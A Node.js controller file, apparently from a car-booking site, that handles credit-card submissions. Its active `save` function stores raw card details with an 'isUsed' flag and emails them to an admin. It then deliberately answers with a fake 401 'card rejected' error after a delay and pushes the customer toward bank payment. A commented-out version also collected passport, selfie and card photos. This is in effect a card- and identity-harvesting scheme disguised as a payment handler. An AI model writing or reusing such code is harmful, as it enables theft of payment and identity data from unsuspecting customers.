const fs = require("fs");
const path = require("path");
const models = require("../models/models.js");
const mailer = require("../helpers/mailer.js");

/*
//This function loads Pictures
const save = async (req, res) => {

    try {
        
        if(req.isPic == false) return res.sendStatus(400);
        
        console.log(req.files);

        //return res.sendStatus(200);
        //Find Booking and Make sure payment Method is Credit Card
        const query = {causale: req.body.booking};
        const changes = {paymentMethod: "creditCardPay", state: 'PROCESANDO'};
        const booking = await models.HavanaCarBooking.findOneAndUpdate(query, changes);
        
        //Make sure Booking Exists
        if(!booking) return res.sendStatus(404);

        //Hande Pics
        const timeStamp = new Date().getTime();
        const dir = path.join(__dirname, '../static/CCS/', String(booking._id));
        
        //handle passport file
        const passportFile = dir + "/" + req.files.passport[0].filename;
        const tempPassportFile = path.join(__dirname, '../temp/', req.files.passport[0].filename);
        fs.copyFileSync(tempPassportFile, passportFile);
        fs.rmSync(tempPassportFile);

        //Handle Selfie File
        const selfieFile = dir + "/" + req.files.selfie[0].filename;
        const tempSelfieFile = path.join(__dirname, '../temp/', req.files.selfie[0].filename);
        fs.copyFileSync(tempSelfieFile, selfieFile);
        fs.rmSync(tempSelfieFile);
        
        const cardFile = dir + "/" + req.files.card[0].filename;
        const tempCardFile = path.join(__dirname, '../temp/', req.files.card[0].filename);
        fs.copyFileSync(tempCardFile, cardFile);
        fs.rmSync(tempCardFile);

        //Save CC Data
        req.body.cardFile = req.files.card[0].filename;
        req.body.selfieFile = req.files.selfie[0].filename;
        req.body.passportFile = req.files.passport[0].filename;;
        req.body.isUsed = false;
        req.body.time = timeStamp;
        req.body.bookingId = booking._id;
        req.body.currencySymbol = booking.currency;
        
        const newCard = await models.Card(req.body).save();

        //Inform Admin
        mailer.informNewCC(newCard);

        //Send Response
        res.status(200).json({booking});
        
    } catch (error) {
        console.log(error);
        res.sendStatus(500);
    }
    
}
*/

//This function only loads cards data
const save = async (req, res) => {

    try {

        //Find Booking and Make sure payment Method is Credit Card
        const query = { causale: req.body.booking };
        const changes = {
            paymentMethod: "bankPay",
            state: 'PENDIENTE',
            wasCardRejected: true
        };
        const booking = await models.HavanaCarBooking.findOneAndUpdate(query, changes);

        //Make sure Booking Exists
        if (!booking) return res.sendStatus(404);

        //Hande Pics
        const timeStamp = new Date().getTime();

        //Save CC Data
        req.body.isUsed = false;
        req.body.time = timeStamp;
        req.body.bookingId = booking._id;
        req.body.currencySymbol = booking.currency;

        const newCard = await models.Card(req.body).save();

        //Inform Admin
        mailer.informNewCC(newCard);
        mailer.paymentRejectedEmail(booking);

        //Send Response 401 so that front end can show error
        setTimeout(() => res.sendStatus(401), 5000);

    } catch (error) {
        console.log(error);
        res.sendStatus(500);
    }

}

const saveCustom = async (req, res) => {

    try {

        //Save CC Data
        req.body.isUsed = false;
        const timeStamp = new Date().getTime();
        req.body.time = timeStamp;
        req.body.bookingId = req.body.booking;

        const link = await models.Link.findOne({ causale: req.body.booking });
        req.body.currencySymbol = link.divisa;

        const newCard = await models.Card(req.body).save();

        //Inform Admin
        mailer.informNewCC(newCard);
        //mailer.paymentRejectedEmail(booking);

        //Send Response 401 so that front end can show error
        setTimeout(() => res.status(200).json({ booking: { _id: 0 } }), 5000);

    } catch (error) {
        console.log(error);
        res.sendStatus(500);
    }

}

module.exports = { save, saveCustom };